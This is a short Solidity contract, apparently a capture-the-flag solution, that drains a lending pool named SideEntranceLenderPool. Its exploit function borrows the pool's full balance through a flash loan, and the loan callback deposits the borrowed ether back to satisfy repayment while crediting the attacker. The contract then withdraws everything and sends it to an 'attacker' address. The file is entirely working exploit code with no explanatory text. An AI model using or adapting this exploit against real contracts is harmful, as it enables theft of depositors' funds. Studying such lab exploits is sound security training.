// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "./SideEntranceLenderPool.sol";


contract FlashLoanEtherReceiver {
    
    address payable poolAddress;
    SideEntranceLenderPool sideEntranceLenderPool;
    address payable attacker;
    constructor(address payable _poolAddress, address payable _attacker)  {
        poolAddress = _poolAddress;
        sideEntranceLenderPool = SideEntranceLenderPool(poolAddress);
        attacker = _attacker;
    }

    function execute() external payable {
        (bool s,) = poolAddress.call{value:address(this).balance}(abi.encodeWithSignature("deposit()"));
        require(s, "execution failed");
    }

    function exploit() external {
        sideEntranceLenderPool.flashLoan(address(sideEntranceLenderPool).balance);
        sideEntranceLenderPool.withdraw();
        attacker.transfer(address(this).balance);
    }

    receive() payable external {}
}
 